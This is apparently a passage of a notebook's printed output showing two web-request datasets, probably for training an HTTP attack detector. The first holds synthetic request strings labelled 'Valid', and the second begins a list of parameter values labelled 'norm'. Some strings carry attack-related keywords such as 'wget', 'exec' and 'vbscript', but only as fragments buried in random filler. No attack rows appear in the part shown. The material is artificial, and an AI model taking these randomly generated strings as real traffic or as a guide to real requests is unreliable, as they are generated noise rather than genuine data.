#   'request': 'cgrsvLtiig9=25access_logbtReceNA&8i=3PITJq&eessChsenoSIrV=vz3&tlN=ahd9ccattncnnas3ftp%5Dnd%25&iotye=7+&7e4=cnfriixftdn&uueniatirn=20414&3xneerterRn=al',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/ausrgLoirlsu/Ytaa/h5scl/Swf3vgihjpeTtipthonw.shtml',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/7.2 (compatible; MSIE 8.9; Open BSD i386; mebmlpu; oinItlo3s; Renenumeh)',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'mnh8c=5611&gNlHO=Bcnt8Euth&yirgi=get%3Aemetan6&r8kdc=ol5&cciiR=ioins5n&pozvEfip=bi&ulyolpeanet=7991549672&toxowttt=wp-jteichild&Rerilodpc4dse=wsmwiaruaEqqi6ohah&3oietitrH3tcp=it%2Ffi&s-aQ-Ldocument=1&oaQI=Yi%25uyaee62e',
#   'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.9', 'interval': None},
#  {'type': 'Valid',
#   'request': '/H8H2Mgroup byf_D2ACke/p7whereZNV@vAb5u/mnN.aspx',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/mLJQ.zjo/nCks7X3/eby@/ssYL_b1/bnodt/tu5mcnit1uyn0odmaxz/EFPqP/oOIqLJnIgu_.htm',
#   'interval': None},
#  {'type': 'Valid', 'request': '/eihemi9mblb/0K.gif', 'interval': None},
#  {'type': 'Valid',
#   'request': '/4lCBN@jvLservicestOv/aVm@XM2VPxWorCag41n/bhcuaoyseG/iykzeiOtkEqsrkmS/2a-Xt/ojvpeFX2S.KscJu/eoava7hliSt.jsp',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'UMOprocessing-instruction7=4',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'UMOprocessing-instruction7=4',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'identity, compress;q=0.8, gzip, identity;q=0.5',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'oi5inwehokeoE=ti&raiub=aUYLcMNHz9',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'ngn0=betweendtotscript5jtu4rTgoit8&ogEaoof1=27&oaoxass=nereisgX3cxhsnnu&bHljU3zCetcF=tfm&acu=-ehtpassc%3A&4lt=cxsiid%7E6rz%5B&dqco72Esjmpa=32278041&cc@g6vMimHps=str&ers=ldo2inll%3Caat&eHatbg1seih=gnEegOsSIfr4rt',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/KevnmtkqmaidkHhexua/trdhp9atwta/eDtr9/iraaitldtd0E/esaZkUgr9T@gDz/oA3x/NautoexecjOpNrc9JOZftp/w0spUShr/rE4nmhEiaNmdrqee3.mdb',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/adminCcmAwnunionJaTC/jVCrcpd@hQVi4kx/asi1O.mspx',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/RisortMmr/QTIlg5bvDRlocation/usiw1omnmemo.png',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/BD_pIC.2perl1nF/oronwhe/annuutoozaruc/rtldeadsc1JieAite/ettSn/hn.wssXVoO2NkkSNRo/ne7oIHBcI-PIsR6-Aqkj/RPzAFA-sl/sstrozewHonrm1.php',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'deflate;q=0.4, gzip, gzip;q=0.6, gzip;q=0.6',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'xbuDeGohLz0=e%3Bs&tpC=lv8TBjO0&fsgidg=9409647&nabvw=870292&itla1teen=6197531&AuevtYlc=+esr+&yDcter=%7EHTeeU+ahinhttp1vy&deest=e&hZEUmail=cZZ2W&_J1DS@ZiWiJ=eqstaoale2g%3D%408&dshz=scripte',
#   'interval': None},
#  {'type': 'Valid', 'request': '/Oseoeotef/ntnnsir0tH.bin', 'interval': None},
#  {'type': 'Valid',
#   'request': 'aueluIrssi51d=zr1q;oenh2aiI=argCnztreplacei+lwiobit;sGi6nbocfneua0n=rDR3X9GX',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid', 'request': '1o8l-ndgrs;q=0.3, u-bu', 'interval': None},
#  {'type': 'Valid',
#   'request': '/y8gpOzlsF2YLDD3aEQ/nite/bpO0gHgvGfO2/trerhrkr/d6@.shtml',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'amoxGIC=cdVv-37fS;tfnshanc=94514825;oeToo=+window.openca;dsnh=vea0moigiOh8link;NTe3S=3985318',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'eoaws0RuT=irewwRtxaubr3oi&3S.oBmOnodeT=pft&.BDo@sqONfWp=oa',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'doiW5pvie=ea3b&tCcmGlimma7rc=632&pexec_inph-xi0G-=79597&alsa=o&qdiRfqt=Ncr%27%5C&eeqnfl=2774976&ruisofghvuwost=r&_xHwTuAoNJmJ=465&WZ-fbinEobl=4&hnokyf=o+rll%7Et&erok5I=79353055&B6ccUbKOGmailhM=e+eermWs6E&tUel0hooksget7=91434',
#   'interval': None},
#  {'type': 'Valid', 'request': '', 'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid',
#   'request': '32ujtn7nt=ih1a+&egseen=6&r84hlec=54&esowsjasttssson=abyhm6iasm&5n8Sae=cr%3FEts%28mtao&ntntwVtEuixnt=fHncnsns&tbobicghsr=hl%25uall3anmconnect&nadh=r3ecotter0tcohae&jee=%2Fnc5&aonroTi=10977899&etoehacEn=IhchildNsTbr%3Em&pbneeendea0=%27%29%3Da',
#   'interval': None},
#  {'type': 'Valid', 'request': '', 'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.0', 'interval': None},
#  {'type': 'Valid',
#   'request': 'zzphputmpKhrR@fD=grH%26disn&noheduaxdfwlE=qdHxeecivefdtiIten&q_.2Pd932iGl=ylocationhtpasspoeno4sogo+&nlh58w1uo3whQr=plsN+h&otswma97r=ltdecnsi',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/eJBj3shutdownY/tnVZ13/rnmdbutOI@-wAfOR-44/Vvfl/Ve/czmstss1tutdk/sdatmaSmxHnhhSaeancz/formTW0a1EPVrg/shonn.htm',
#   'interval': None},
#  {'type': 'Valid', 'request': 'cobsntefol=nhe', 'interval': None},
#  {'type': 'Valid',
#   'request': 'ebg1vHe=ldQTCng&kaccepto7t=s4vbscript%40&thu=c%26n&8tLhR=746465518&ole6u=52&edoeu4o=24867885&WtXf7o=h%3Cq%2FbEjt%3AoNai',
# ...
#   'interval': None},
#  {'type': 'Valid',
#   'request': 's-ebkAxeAu;q=0.0, cdne-Nanpcf7i, 8ei-e, zneo-rhaiij',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '9Iq4UvnodejP4body=eiKeTrrxois&on=uFP1MJwX&akl=BhBi&lnrbd9Dkp0tnc=teboot.initchomexOld3a9%2Fm%25m5E&wio3t=a&GBeaBCYo5wjS=pzty&hddwu=oYWu&rtis8rurprmtekn=mwget',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'btsmRehtA=eG%3Dt;nti9vdq=20583625;node2ZEALU=anntnchu;oeS=ote%7E;drop5yV=xnmu',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/0.8 (Machintosh; U; PPC 9.0; os-en; rv:7.0.7) Gecko/38035384',
#   'interval': None},
#  {'type': 'Valid', 'request': 'dyyr=ejhYobVy70', 'interval': None},
#  {'type': 'Valid',
#   'request': '/5awNAmn/9jPIiW5VZvOxYtdo3/rqP7FGONi90Eu/FtZEGE1/lhtpassP/lo/fWfOUdF1-XM/UVfPaAku-_.gif',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/8f9thc/t6myg42nnGfNi9rtf/go/luitODh/eFenieSiadrnei/terecba4stgmoerudwe/e6xdne/9xel1/gwFOtGfzyxZ_/nNTy0_Ji57hFrJWtRC@0/lxmJ/ie.asmx',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/b0JXOH9QOQyhM/sATPQO/sqRW.8Rk4fqu8S9OFdWA/h@kq41mqm8Go672HB/iwsgehdr6rdrwMeE4rxO/ohga/etz3ytyahrpr0xc79/sutlecsHeh6uEa/2p/n9eirmGs5ttheSsgsili.tiff',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/tecetrr7/ttxU9KuG/n_Hj0py/oinputt/cbzoEseBuimheuihhr/s6A2HH34fnrE@FXU/sp6iecimr0/uFstfrtrirtl9aue/nMz@08.js',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'identity, deflate, identity;q=0.4, compress;q=0.8',
#   'interval': None},
#  {'type': 'Valid', 'request': 'y5enttesMo9e=0062881', 'interval': None},
#  {'type': 'Valid',
#   'request': 'gzip;q=0.8, compress, compress',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'iIey2iracaey6G=66236256;nEio=ed;aeiloi=oBzebti',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/5.5 (Machintosh; U; Mac OS X 3.0; Hk-yh; rv:7.1.2) Gecko/43195036',
#   'interval': None},
#  {'type': 'Valid', 'request': 'rt0tkysheynuem=8085646', 'interval': None},
#  {'type': 'Valid', 'request': 'sreDqerehs1eeee=49463363', 'interval': None},
#  {'type': 'Valid',
#   'request': '/ax/qZn9o_logQvarSwFc-C/xv3wxU_9r_MY/x.0aexecIur@Oy/gkmeihsvdiieraoryg7e/DKFphppOIOLwp-8qa/4rH@rWHK/tmt4xonO/eyOh9h/etDKxnHB0vmq/0AHCXB6R4BWIb.mdb',
#   'interval': None},
#  {'type': 'Valid', 'request': '/hTpehutayuaa3tl.cfm', 'interval': None},
#  {'type': 'Valid',
#   'request': 'n6aesueSz4=92;7rpcbrudjN=eehxyxoa;cedlea=ospnesolog',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'r0s1=s-i&amtiR=122004&eLyt0.pbodyHbJ=41241752&meOhOo=718&vna=et%2Beerr&Evart0E=0&ls=aAe8iFlho4a',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/ifGRRix/o9VP_/4e/einorogztsc4qdmnh/dT5P9t9/rD/egt-_pIjfP5lbUcDnKEB/pnl5ztnjhin/nk6SpMU0MGemubj8pLT/@J-5Cf.OQZs/rla5wnRcmfi6eroi3Nt/Ipq1.php3',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid',
#   'request': '/6ByqIservicesZcvVQtTF8/sEqJe/etkpir5kay8hsrCxrhh/oheTok6.mspx',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'etfg-Epdtuz, 6st94dn-i, r-ot;q=0.6, fbeh35ns-Lqnibros',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'OI7Am=in-%29e%25te%40s%2FtWe;9RIcopynyo=utraaiaee;nhit1dsoedge=45;rmtiuskit=-B+6usttbenri;tpemiaer=1866',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'uannai=3&img1Fj9UyVwZW5=yA.Uduvqp&oeeSuyrmg5tloe=844165&XkHM0dwF=0he&er=eqEoehadtr&0QNPV=diov2ASWDx',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/syZyNQ/uZWZwS0mHI11NA00P/oTwXKY/iM/y62nZw7y9tjBo6NjUE@/mPyBu7oNwnIvil.ucOcE/bEwatrrthtogecweegU.jpeg',
#   'interval': None},
#  {'type': 'Valid', 'request': '1tndyaT/0.0.4.9', 'interval': None},
#  {'type': 'Valid', 'request': 'EKf=rtn2sNxc', 'interval': None},
#  {'type': 'Valid',
#   'request': '/hq_-su4uRGHdThR/5WxEFa4hhaOQA.cfm',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/fYLm_C9PC66jrx4ynKX/bd-ajuN2Og@52zR/ntzcmIibnN/hcmgecoRycoua5/j1@wX.JFo/fkP@-K7Z7A9/Reedcroloao/1NJ2wRZs/dbesytslGlnx8iwptOX/mIer/cdt2dakIYhoiz8dhip/edcn1olb.tiff',
#   'interval': None},
#  {'type': 'Valid', 'request': '/bpjPj.jpg', 'interval': None},
#  {'type': 'Valid',
#   'request': '7faB=23xp9&ctf=w%25aruaa8&aedz6xeihZ=e-dUIYCc_7wt&tmgthsyhhdn=72845422&6Hmeta52XqrX@k4=60&YlQC=sek9R%5Dr%3AR%29&Ihenn=-1o&ostd=iyttnot8hnra&Mym@=caroc&3da=aendlIlrolsseto&eJrwofm=9649&mww169=chcw5xRwy&96pZhtpass75=030942263&rld=1799075&tnnove=e%2Fe%40y-Sc%28orshutdown',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'ie=rrQ&osm=lud&5ecsetuslMpw=0085&taraIhrte=l&DCvbscriptzyw=985478&es=837965&elL6beia1in=hkppe&eiasobeep=5401883&tirc=t2S4vtjb&noorofs=3131&ttc6shivTbn4=Gskfeeho',
#   'interval': None},
#  {'type': 'Valid', 'request': '', 'interval': None},
#  {'type': 'Valid',
#   'request': '/noTieqaetdmhehhnEh/iwTihekaDgwfsQEttiyw/eiwWkAFt/_MN5hdeleteg/NOEDphpVL4exec2C/34mMVTlKB3p1O/m9gIwmthYsC.wTpWLUt/wfftpzgY2/bxDYMXFpJ1P6O.php3',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'eoT-ierauwnl;q=0.0, Rdtoasm-tas8elc;q=0.8, 0ta5cwa-MlAotoy;q=0.8, r2eeRAx-tHioAoa',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/th10JQDbpq/5rgry5betnhRNe4/9fJ4t/ymBX15B0MQWt-2usahW/nfK4P2U7FJNjpfM0/eatvhlmar8nrao0ovet/.vQpGVbW6F/rv.73_k.o/imtervwihU/gVG@qz2izVW95LZl/swn/eoaSuBJpQ.dll',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/0.7 (Windows; U; Win 9x 2.7; iz-mn; rv:1.6.1) Gecko/21127968',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'eatitee=tr%27U&Eixm2=978621500&eeHui6yg8t=r0ot',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/9.2 (Machintosh; U; PPC 4.7; iH-to; rv:2.7.0) Gecko/17121334',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/KcEae/MatEne/nNNonx/u6W8odpLp_sp3/pteneacHsvtRtnoo6l/c3fF4seesfono/2lJwilef/ei5heitEUOsdhrsaa/p0_vYCs6FlwlMlSFxx/um/r1cEzqd0h@xoB/DscriptG21pRY.tiff',
#   'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.1', 'interval': None},
#  {'type': 'Valid',
#   'request': '/iSainenkS6lresUampd/AZHsier7ssa/4gsjre.aspx',
#   'interval': None},
#  {'type': 'Valid', 'request': 'O21oemiane=9', 'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid', 'request': 'NnshdSn8aAea9=teojg', 'interval': None},
#  {'type': 'Valid',
#   'request': '/hjvW/enhlr1wwDhsolesdBap/WYwp-95EgSgroup by/VfFmlbU2/auuiCb2ikxd/ys/iK-vYytxh8QevlVh_/rcyl3mk6Is/e6yBCmr6dkmQJBt4ZR/rOZzZMAS.J_z/yd.png',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/PsLhe6honnCmtwnsSd9/tHaoEchtvai4t9wrlpsh/fLB4HT/dfZKh4Sgj1PKlxl/ts7T/2K/0J3KUAca53chLtWBdZQe/gbs/olE.gif',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'ZsVH=7&na=%40owttmeta&Ntptyebh=fJ3p-h1NP0SX&EiA=%29imtieit%3Baaa&ijtse7siOupA=+vbscriptg&thgIapae4rGso=fSiYsstulenoreS&oaz8SE8drjt=iEfaegoa&nuttuegirutj=317&sfhtSis=sL.Rvs1b',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid', 'request': '', 'interval': None},
#  {'type': 'Valid',
#   'request': '/7m/n5EZeBzUz/eismcdiKokdsu/qWZ6xtQjpQpu/6lnele22faincnisd.shtml',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/opufpei2iBeut/vOK3SubHd96POjG@5A.css',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/ehtheitsrv/b5mtoaosme/wIo5y/c1VB.jsp',
#   'interval': None},
#  {'type': 'Valid', 'request': 'ifcidon=4entpih', 'interval': None},
#  {'type': 'Valid', 'request': 'Neqstherarmrsr=oiKLAIuR', 'interval': None},
#  {'type': 'Valid',
#   'request': 'uow9=wooni&cs=ol6e&ht3lTr=4ntmpG&tdnon8tagS=jse',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'gme17EuF3=%40cqhttpsi+aeEtma%7CIito&iaVelv=231&Bltce5iensht7it=55jg07H&lbh=oniEernaqeb5wtwhpr&OQtpJtSL@0aV=i%3A+ri&znrEfioArow=ciEn8M&hohdie=%40&PU8ZUy=2956112522&grecrdahmetansg=mhomevayTl+n&utitetstaf=9024357&XJhxUsystem=lBS&ineh=rrsotjyrosmsvl&da2Eothaegu=%40',
#   'interval': None},
#  {'type': 'Valid', 'request': '/yidnBo/o4c7@jSpv_tFZ.gif', 'interval': None},
#  {'type': 'Valid',
#   'request': 'foxOdf=zervDrsol&rkserwoxnshe=ocRei&AnsdElrrelhd=sia%27s%7C%28U',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/7.1 (X11; U; SunOS sun4u 3.5; bg-to; rv:5.6.6) Gecko/52751847',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/uHg5R005CtRJk/docandns3Nf8.shtml',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/m3iiiai2foes/Gjt1v3/eDWBopzuAMNeJT/TAtNso1gdlk/INHnuOhFUn.kJT.php4',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/ntejfk/e2EXmZ8aWV_t/t60yk@7/behYTieQEes6ejufx6rE/eserYbopbtfasee3ossa/lOugzqLgptK6gJ/ryynuwa/eX.jNKceE4UTz0/a5wAu5ag8v0vF.pl',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/xit75ddenw/sP.h4YfIXeKDSWpR/leY2Sonfa/pZ0jeBMwPIFDG72/s9nobirlds0iaigc3n/HZpvf7C.htm',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'AnyihgksWhvaen=56087&raa9enl=%5Bt14&body1iconnect26=39529502&rosh=TopteS%289imhttps%3Cde7es%2F+e&ftzvcnszbibtg=nem&tlIa5Oapa=meryDss7irgia&tLtd@nullor=e&r8ofi5MraeSNNrn=onbsytwrhnAir0&wawuhzrieenetwt=247556&0n5WjwNsa=824150',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/aBr/iKY/1di8/wHeu.@vw4ZrxDSpxDh/u5K-UUAposition_qDMt/0tkH1y@sIMu-UG3uJGrV/en.u97zc/t1xpvB2SNnwu/pl83QTs2W/vGw/mMsoeekrhhneu/h9N2Ju_.jpg',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/8.4 (compatible; bowdi; Win98; syrtt)',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/eiB4oq_/syr3ofods/vpfWTcaXOtWX_2v/a0aThQFe.hj/SNWavlib@hy-50rw/fsapigapkEit/uKt/1FB-JvB/iY4bLDwC0c@-OsWX/bTp.gif',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'ibuhqeis=einsertevilxb8h%7Cnem',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'compress, compress;q=0.8, identity;q=0.0, identity, compress;q=0.2',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'asohodmTa=adL6abuLr1Nd%2F&le0Nesregad=8Uu9DpEw&pa5piaUkc=0&UhEihsrnlre=330894&zKYE=rdem0selectenh%3CD%28a&oe8aue=octrTikwntf0wr&bgnmlsma=nzinHrerJool',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'ddtegamtsa=nP6&onwduTmf1jl=lLdir0a',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/w36E2XXAo09nV/u0DsCSRQyNLX9_-CKj/bNV.mAzTLfQbGvU/tvjs7x2Zs_X.mspx',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/hC/ue/vipNye1vet1rsNa2aseo/isWm_RP9/56xemya2re2f/9ipBhletzua.asmx',
#   'interval': None},
#  {'type': 'Valid', 'request': '', 'interval': None},
#  {'type': 'Valid',
#   'request': 'VLez=901&hipEryycufqd=hhua&tacEhds=644&@KMchildPqbA.=18027&Esdtun6esf2s=deetse2tCrirens&WHUB=07380225&lovautyev=TsaeSesouseeet&rEdzepikaa=w+nhRmif1httpo+I%28a&srswzu3wc=%27mtideoYdlgts9s&N4cvP=h5wDHB5N&PFohttps7YOT9=%40hhzo&dbpenRNtrwseeot=mmswxTian',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'f5npasa5=bli%40access_logNoPeaglc;trtmkct=-s',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'f5npasa5=bli%40access_logNoPeaglc;trtmkct=-s',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid',
#   'request': 'Q2sQ0N=u0AO&uyCl-LI04OPM=i1dohwoSA&nartlr=shttpsock_streamandahtaccesfbey+p4aW&KoD9lVxml9R=o9aitme9njotor&enbvtm=tz+s%26+nt0a&d90itq3ctscr=iNua3%24E&o2ooAnav5esnith=7a++en%5Br',
#   'interval': None},
#  {'type': 'Valid', 'request': 'lnare-unaad', 'interval': None},
#  {'type': 'Valid',
#   'request': '/aYrAR5HMOOur/edP2_9sG8h0/ayobee8n4njoea/0c_BHYI9zR1HqmFX/tneatiIaknLIni/m.mEYvGAg5@Rr6/5_Vperl.dll',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid', 'request': 'ttasrisntotcnle=0822260', 'interval': None},
#  {'type': 'Valid',
#   'request': 'escripthtaccesss=85&ubb_xss-u@b2=4572438&e4ttrneeeu=oO3y%27unvv4nid&5nKqnph-C=sgiD0alry4eiajta&twvtu0so6e=d6CYEJ835x8&stoaoEudDitmnuk=033&Mnsb=02&akuhitC=I32%3Es%40p%25uaObin&techozvG=4&tdo8baEouoe=y5&Binput.input6j-=3GM6-hNek&z5uK@R=rsyiEin',
#   'interval': None},
#  {'type': 'Valid', 'request': 'identity;q=0.6', 'interval': None},
#  {'type': 'Valid',
#   'request': 'hy2i-eie;q=0.3, T-htev, meoc-ffguca;q=0.4',
#   'interval': None},
#  {'type': 'Valid', 'request': '/wHC@.htm', 'interval': None},
#  {'type': 'Valid',
#   'request': '/emFNykSTl_PIWkRQ/Ie/QLadminYgvishutdown7ml/-c7locationZmocha3bodyetc8H/tw9pTNtrre0TmW/hastlh3hnidMlt.css',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/isOWrjXSj/ch/5V5EOGQopenBJlp4/.sCrpCAT1fw.html',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/3.0 (compatible; MSIE 7.8; Mac OS X; IqFk3ee6; rljenRhR; GRftsfTni2)',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/tlqKy5/rDITFHI/O1zq4y3/nafOeXs4etf/2u@slEQU-XFHGLEx1hc/OVVlg.php',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/e4r4uhiea1eb/Ea2reSfpiebzt1/cebobtatueeg90enrm/an/snAsildsljhes2/llennbilmo7sutoidl/o0SXAFYsUPU5.gif',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'fNcmdh=otat&usbPdhkseidb=en5tiii&AyaeT=sWP&-WH.=mvNKKVDnNKz&ibtloere=ekceao-L&jdqR=95&T9s=a9E&ye=8310815',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/6e/cOshoardieaerTe/0s2Fo7CPT08Z7kQERn/u@xDLVVRQWxT82f9w/tyWkpg/hvncl3hqu5pA3n8i2nb/6OuiLxiV1/LKUteTyEb6acceptUOqm.mdb',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/n6f_UMBcLbtW/m_q@ZB2iYNrH/Vyau49lza/demb3rnEmooNion/V7ouwgetK/gA0eHpp_lb1JM9kn3/z6FX0wwP/U1opbSz.jpg',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/tanb1aY6aeiGm/tDjkV.vrH8J7FpUYKl/sheildncNfarse/rQirhFTPJzwL_fbWlK/aeIahstd/oosOhlhtsbosb.msf',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'yTc2TpuZcJ=bce&cdeoaTbteDoKhof=x%40FViFsWr&9oea4eHfextkDx=hbIamea&vcrstejdcter=950&lvhdte7s=87467&shol=+aocor&utyued9eb=d%3Fhavinghy&mlc=sGkSKvzrkRON&nbtslnnow4=exo&tddededloiao=fydrtrer&HFBGfFZ6usr.44=jprocessing-instruction%25Shrcpprocessing-instruction++m%2F0e',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/4of4rUoStuharcjblbVr/oq5ASHIUH4XnyE/5dYIqV.shtml',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'ekge3f-dT;q=0.5, oeg-quses;q=0.7',
#   'interval': None},
#  {'type': 'Valid', 'request': '/Wlcnt2Nrc5qoDim3ta.msf', 'interval': None},
#  {'type': 'Valid',
#   'request': '/en/qwxjepwtAwne0eraew/n@W/PdroplxG/detIsUaita/HMwwITe2x0@/1Iu9EDC/t9BLUSfnXr9tZjVBFQ/2qlL8jUa37RGwZN1/ekW_nd.jpeg',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'vo9Ms1 http://www.dtsnlo0o.fr',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'tsddsuotr2rise=169385&a0tns8eeera=odijy&t3seuoei97=839397&hc4ESn=te5o&revj=js1lh+sb&snmtpT=aEX_kFf19lF.',
#   'interval': None},
#  {'type': 'Valid', 'request': 'ndaxhaOUletnecynme', 'interval': None},
#  {'type': 'Valid',
#   'request': '/l3k5UaG1/ttlncdbi/GtmpErauqam-Ke8Y.png',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/eXaJfPpKjmJc1YB7/mdTovgcYuo/uq6i4os3/58dtzotehTSYiWEK47cb/pCqX5ZXRpUQ_qvMiXkP/dJ11vyandovaDR0/boir9noieLs1S/p2ld/ejwi3u.asmx',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/n60QG_zD.Lg0/h5uX9oQdEDeJ2D/scXZCl-K4.php3',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/i8T0o@C9sUUI_tlmBDyY/bLSGbmH/select1VETiqXYMdChttp.html',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/bataiefre3dnlv/dvZOaccess_logLFOV/sl/sqot0_4/mmu1mz/eydeHbermief/i@_yRVYjbCEZUmmG1/gWCG_Pgd7qGLi_/ot3n/euz/rzWvla9ZAEVCQLRF1v.nsf',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/ekZRNeVvKRR.5q/rcsjidieeInrestsm/Iafcme2hthhsteodohnb/tz1r/Wj7/csCt-7z5zdjc./61U0APVE_V21g/eosfreoedHwtitht1e5/aWXq59WmSqc7F86dn/esrfr3eilcqmaatrvtd/ieoeioqn.css',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/miso/lmGtOdEw@/lhtlssyihe/lw/xCwheretTyK/e.piHcdSthUYTUOh6lv/cseptbShr/iNLhdXKX98ps9Bf/cjuGa1chuecorte/tszdIdsthepidn/rhbtarrtiv/71itkc.nsf',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/b0/orbmbesLsdft3imziIdw.png',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/ObkB4tmpnyhaving/bt6lihp7e9lant/ubmiGZ/olrhnTeamud/eQu/05SSeSR5KWn/65dyiialpedatontlae/positionh/xS/1SsgATCp/8Al9Twd1zTjgZs1nq.gif',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid',
#   'request': 'nglhcta-Ofgmo, 2odqudm-98Uis2n3;q=0.2, meeiyC-svldt;q=0.4',
#   'interval': None},
#  {'type': 'Valid', 'request': '', 'interval': None},
#  {'type': 'Valid',
#   'request': '/uhnuroniu/PD9b3sGG_/8sTSqyJF7ttH1Lp/iMiT0olIM0NbExJm8f/dselectj@3skapXRO.asmx',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/gu5abdktR/9YgopenslsEIY7U01K/yp/8HvirCZ2rt6fvB9C/lTt.dll',
#   'interval': None},
#  ...]

# %%
with open('HTTPParams.json', 'r') as f:
    custom = json.load(f)

# %%
custom
# Out:
# [{'payload': 'c/ caridad s/n', 'attack_type': 'norm'},
#  {'payload': 'campello, el', 'attack_type': 'norm'},
#  {'payload': '1442431887503330', 'attack_type': 'norm'},
#  {'payload': 'nue37', 'attack_type': 'norm'},
#  {'payload': 'tufts3@joll.rs', 'attack_type': 'norm'},
#  {'payload': '22997112x', 'attack_type': 'norm'},
#  {'payload': 'arenas de san juan', 'attack_type': 'norm'},
#  {'payload': '19245', 'attack_type': 'norm'},
#  {'payload': 'fennell', 'attack_type': 'norm'},
#  {'payload': 'd50allecido', 'attack_type': 'norm'},
#  {'payload': 'genny', 'attack_type': 'norm'},
#  {'payload': '03248i367ca', 'attack_type': 'norm'},
#  {'payload': 'grubel8@albeiteria.kw', 'attack_type': 'norm'},
#  {'payload': '83497200r', 'attack_type': 'norm'},
#  {'payload': 'martn de yeltes', 'attack_type': 'norm'},
#  {'payload': '1769471856078209', 'attack_type': 'norm'},
